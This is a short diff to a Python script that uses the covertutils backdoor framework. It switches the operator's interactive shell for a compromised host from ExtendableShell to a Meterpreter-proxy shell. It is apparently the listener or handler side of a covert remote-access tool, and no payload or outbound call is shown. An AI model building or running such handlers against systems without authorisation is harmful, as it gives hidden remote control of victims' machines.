@@ -1,15 +1,15 @@
 #!/usr/bin/env python
+from covertutils.shells.impl import MeterpreterShell
+# from covertutils.shells.impl import SimpleShell
+
 from covertutils.handlers import BaseHandler
 from covertutils.orchestration import SimpleOrchestrator
 
-from covertutils.shells.impl import ExtendableShell
 
 
 import sys
 import socket
 from time import sleep
-
-from hashlib import sha512
 
 try :
 	program, port, passphrase = sys.argv
@@ -53,6 +53,6 @@ class MyHandler( BaseHandler ) :
 		s.close()
 
 handler = MyHandler( recv, send, orch )
-shell = ExtendableShell(handler, prompt = "(%s:%d)> " % client_addr )
+shell = MeterpreterShell(handler, prompt = "(%s:%d)[metproxy]> " % client_addr )
 
 shell.start()
